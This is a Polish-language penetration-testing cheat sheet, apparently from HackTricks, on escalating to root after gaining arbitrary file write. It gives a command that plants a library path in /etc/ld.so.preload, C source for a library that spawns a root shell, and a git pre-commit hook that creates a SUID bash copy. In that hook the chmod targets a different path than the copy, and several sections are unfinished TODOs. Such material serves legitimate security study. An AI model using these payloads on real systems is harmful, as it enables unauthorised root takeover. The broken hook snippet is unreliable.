# Dowolne zapisywanie plików do roota

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Ten plik działa jak zmienna środowiskowa **`LD_PRELOAD`**, ale działa również w **binarnych plikach SUID**.\
Jeśli możesz go utworzyć lub zmodyfikować, możesz po prostu dodać **ścieżkę do biblioteki, która będzie ładowana** z każdym wykonywanym plikiem binarnym.

Na przykład: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) to **skrypty**, które są **uruchamiane** przy różnych **zdarzeniach** w repozytorium git, takich jak tworzenie commita, scalanie... Jeśli więc **skrypt z uprawnieniami lub użytkownik** wykonuje te działania często i możliwe jest **zapisywanie w folderze `.git`**, można to wykorzystać do **privesc**.

Na przykład, możliwe jest **generowanie skryptu** w repozytorium git w **`.git/hooks`**, aby był zawsze wykonywany, gdy tworzony jest nowy commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### binfmt_misc

Plik znajdujący się w `/proc/sys/fs/binfmt_misc` wskazuje, który plik binarny powinien wykonywać jaki typ plików. TODO: sprawdź wymagania, aby wykorzystać to do uruchomienia rev shell, gdy otwarty jest typ pliku. 

{{#include ../../banners/hacktricks-training.md}}
